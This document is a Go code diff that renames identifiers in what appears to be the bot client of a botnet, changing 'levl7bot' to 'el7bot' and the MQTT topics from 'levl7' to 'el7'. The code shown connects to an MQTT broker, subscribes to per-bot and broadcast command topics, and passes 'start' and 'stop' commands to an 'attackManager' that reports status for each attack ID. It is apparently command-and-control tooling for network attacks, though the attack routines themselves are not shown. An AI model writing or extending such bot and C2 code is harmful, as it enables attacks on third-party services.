@@ -23,7 +23,7 @@ func logf(format string, v ...interface{}) {
 func main() {
 	hostname, _ := os.Hostname()
 	broker := flag.String("broker", "tcp://127.0.0.1:1883", "MQTT broker URL")
-	username := flag.String("username", "levl7bot", "MQTT username")
+	username := flag.String("username", "el7bot", "MQTT username")
 	password := flag.String("password", "", "MQTT password")
 	botID := flag.String("id", hostname, "Unique bot ID")
 	flag.BoolVar(&verbose, "verbose", false, "Verbose logging")
@@ -39,15 +39,15 @@ func main() {
 	opts.AddBroker(*broker)
 	opts.SetUsername(*username)
 	opts.SetPassword(*password)
-	opts.SetClientID(fmt.Sprintf("levl7bot_%s", *botID))
+	opts.SetClientID(fmt.Sprintf("el7bot_%s", *botID))
 	opts.SetCleanSession(true)
 	opts.SetConnectionLostHandler(func(c mqtt.Client, err error) {
 		log.Printf("MQTT connection lost: %v", err)
 	})
 	opts.SetOnConnectHandler(func(c mqtt.Client) {
 		log.Printf("Connected to MQTT broker")
-		topic1 := fmt.Sprintf("levl7/cmd/%s", *botID)
-		topic2 := "levl7/cmd/all"
+		topic1 := fmt.Sprintf("el7/cmd/%s", *botID)
+		topic2 := "el7/cmd/all"
 		token := c.Subscribe(topic1, 0, makeCmdHandler(manager, *botID))
 		token.Wait()
 		token = c.Subscribe(topic2, 0, makeCmdHandler(manager, *botID))
@@ -115,7 +115,7 @@ func makeCmdHandler(manager *attackManager, botID string) mqtt.MessageHandler {
 				"time":      cmd.Time,
 			}
 			payload, _ := json.Marshal(status)
-			client.Publish(fmt.Sprintf("levl7/status/%s", botID), 0, false, payload)
+			client.Publish(fmt.Sprintf("el7/status/%s", botID), 0, false, payload)
 
 		case "stop":
 			manager.stop(cmd.AttackID)
@@ -124,7 +124,7 @@ func makeCmdHandler(manager *attackManager, botID string) mqtt.MessageHandler {
 				"attack_id": cmd.AttackID,
 			}
 			payload, _ := json.Marshal(status)
-			client.Publish(fmt.Sprintf("levl7/status/%s", botID), 0, false, payload)
+			client.Publish(fmt.Sprintf("el7/status/%s", botID), 0, false, payload)
 
 		default:
 			log.Printf("Unknown action: %s", cmd.Action)
